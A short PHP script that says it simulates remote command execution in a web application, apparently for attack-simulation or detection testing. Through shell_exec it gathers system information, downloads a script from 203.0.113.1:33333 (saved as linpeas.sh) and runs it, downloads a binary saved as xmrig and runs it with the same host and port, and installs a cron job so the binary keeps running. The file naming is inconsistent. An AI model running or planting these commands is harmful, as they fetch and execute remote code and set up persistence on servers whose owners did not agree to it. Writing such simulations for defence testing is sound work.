<?php
echo "Simulating remote command execution in the PHP web application\n\n";

echo "Running discovery commands and tools.\n\n";
shell_exec("uname -a > /tmp/output");

echo "Downloading and executing script malware\n\n";
shell_exec("wget http://203.0.113.1:33333/script -O /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh");

echo "Downloading and executing binary malware\n\n";
shell_exec("wget http://203.0.113.1:33333/nc -O /tmp/xmrig; chmod +x /tmp/xmrig; echo | /tmp/xmrig -v 203.0.113.1 33333; echo \"* * * * * /tmp/xmrig\" > /tmp/runjob; crontab /tmp/runjob");

echo "Remote command execution completed.";
?>
